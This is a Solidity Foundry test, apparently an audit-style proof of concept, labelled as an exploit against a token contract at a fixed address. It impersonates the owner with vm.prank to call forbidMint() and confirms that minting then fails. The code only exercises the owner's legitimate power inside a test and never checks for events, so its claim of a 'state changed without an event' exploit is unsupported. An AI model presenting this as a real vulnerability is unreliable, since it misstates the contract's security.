// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface StandardToken {
    function owner() external view returns (address);
    function forbidMint() external;
    function MINT_FORBIDDEN() external view returns (bool);
    function mint(address _who, uint256 _value) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
        // The target contract is already deployed at TARGET
        // We need to find the owner address first
        address owner = StandardToken(TARGET).owner();
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "Big League Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the current owner
        address owner = StandardToken(TARGET).owner();

        // Step 2: Impersonate the owner and call forbidMint()
        vm.prank(owner);
        StandardToken(TARGET).forbidMint();

        // Step 3: Verify that MINT_FORBIDDEN is now true
        bool mintForbidden = StandardToken(TARGET).MINT_FORBIDDEN();
        require(mintForbidden == true, "MINT_FORBIDDEN should be true after forbidMint()");

        // Step 4: Demonstrate that minting is now forbidden
        vm.prank(owner);
        // This should revert with "mint is forbidden forever. sorry"
        bool mintFailed = false;
        try StandardToken(TARGET).mint(address(this), 100 ether) {
            // Should not reach here
            mintFailed = false;
        } catch {
            mintFailed = true;
        }
        require(mintFailed, "Mint should fail after forbidMint()");

        // The exploit is successful - we've shown the state changed without an event
        console.log("Successfully called forbidMint() as owner");
        console.log("MINT_FORBIDDEN is now:", mintForbidden);
        assertEq(mintForbidden, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
